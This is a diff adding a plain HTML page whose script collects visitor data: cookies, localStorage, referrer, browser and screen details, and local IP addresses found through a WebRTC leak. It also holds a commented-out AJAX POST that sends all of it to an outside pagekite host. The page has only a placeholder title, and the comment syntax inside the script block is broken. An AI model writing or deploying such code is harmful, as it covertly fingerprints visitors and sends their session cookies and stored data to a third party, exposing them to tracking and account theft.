@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"
+        integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
+        crossorigin="anonymous"></script>
+    <script>
+        jQuery(function(){
+            var info={
+                timeOpened:new Date(),
+                timezone:(new Date()).getTimezoneOffset()/60,
+
+                pageon: window.location.pathname,
+                referrer: document.referrer,
+                previousSites: history.length,
+
+                browserName: navigator.appName,
+                browserEngine: navigator.product,
+                browserVersion1a: navigator.appVersion,
+                browserVersion1b: navigator.userAgent,
+                browserLanguage: navigator.language,
+                browserOnline: navigator.onLine,
+                browserPlatform: navigator.platform,
+                javaEnabled: navigator.javaEnabled(),
+                dataCookiesEnabled: navigator.cookieEnabled,
+                dataCookies1: document.cookie,
+                dataCookies2: decodeURIComponent(document.cookie.split(";")),
+                dataStorage: localStorage,
+
+                sizeScreenW: screen.width,
+                sizeScreenH: screen.height,
+                sizeDocW: document.width,
+                sizeDocH: document.height,
+                sizeInW: innerWidth,
+                sizeInH: innerHeight,
+                sizeAvailW: screen.availWidth,
+                sizeAvailH: screen.availHeight,
+                scrColorDepth: screen.colorDepth,
+                scrPixelDepth: screen.pixelDepth
+            };
+
+            function findIP(onNewIP) {
+                var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                var pc = new myPeerConnection({iceServers: []}),
+                    noop = function() {},
+                    localIPs = {},
+                    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
+                    key;
+
+                function ipIterate(ip) {
+                    if (!localIPs[ip]) onNewIP(ip);
+                    localIPs[ip] = true;
+                }
+                pc.createDataChannel("");
+                pc.createOffer(function(sdp) {
+                    sdp.sdp.split('\n').forEach(function(line) {
+                        if (line.indexOf('candidate') < 0) return;
+                        line.match(ipRegex).forEach(ipIterate);
+                    });
+                    pc.setLocalDescription(sdp, noop, noop);
+                }, noop);
+                pc.onicecandidate = function(ice) {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
+                        ice.candidate.candidate.match(ipRegex).forEach(ipIterate);
+                    };
+                }
+
+                var ul = document.createElement('ul');
+                ul.textContent = 'Your IPs are: '
+                document.body.appendChild(ul);
+
+                function addIP(ip) {
+                    console.log('got ip: ', ip);
+                    var li = document.createElement('li');
+                    li.textContent = ip;
+                    ul.appendChild(li);
+                }
+
+                findIP(addIP);
+
+            <!--$.ajax({-->
+                <!--headers: {-->
+                    <!--'Content-Type': 'application/x-www-form-urlencoded'-->
+                <!--},-->
+                <!--type: "POST",-->
+                <!--url: "https://drivetest.pagekite.me/myapp/rest/japra",-->
+                <!--dataType: "json",-->
+                <!--data: {-->
+                    <!--info: info-->
+                <!--}-->
+            <!--});-->
+        })
+    </script>
+
+</body>
+</html>
